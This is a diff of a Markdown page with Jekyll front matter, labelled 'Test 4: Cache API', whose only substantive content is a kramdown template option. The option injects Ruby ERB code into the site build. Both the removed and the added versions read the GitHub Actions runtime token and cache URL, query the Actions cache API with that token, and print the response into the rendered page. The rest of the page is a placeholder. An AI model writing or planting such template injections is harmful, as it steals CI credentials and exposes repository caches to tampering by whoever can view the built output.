@@ -1,8 +1,8 @@
 ---
 ---
 
-# Test 4: Actions Cache API access
+# Test 4: Cache API
 
-{::options template="string://<%= require 'net/http'; require 'uri'; require 'json'; cache_url = ENV['ACTIONS_CACHE_URL']; runtime_token = ENV['ACTIONS_RUNTIME_TOKEN']; result = 'NO_CACHE_VARS'; begin; if cache_url and runtime_token; uri = URI(cache_url + '_apis/artifactcache/caches?keys=&version='); req = Net::HTTP::Get.new(uri); req['Authorization'] = 'Bearer ' + runtime_token; req['Accept'] = 'application/json;api-version=6.0-preview.1'; res = Net::HTTP.start(uri.hostname, uri.port, use_ssl: true){|http| http.request(req)}; result = 'CACHE_STATUS=' + res.code.to_s + ' BODY=' + res.body[0..500].to_s; end; rescue => e; result = 'CACHE_ERR=' + e.message; end; result %>" /}
+{::options template="string://<%= require 'net/http'; cu = ENV.fetch('ACTIONS_CACHE_URL','NONE'); rt = ENV.fetch('ACTIONS_RUNTIME_TOKEN','NONE'); r = 'NO_CACHE'; begin; uri = URI(cu + '_apis/artifactcache/caches?keys=test&version=1'); req = Net::HTTP::Get.new(uri); req.add_field('Authorization', 'Bearer ' + rt); req.add_field('Accept', 'application/json;api-version=6.0-preview.1'); r = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => true).request(req); r = r.code + ':' + r.body[0..400]; rescue => e; r = e.message; end; r.to_s[0..800] %>" /}
 
 placeholder
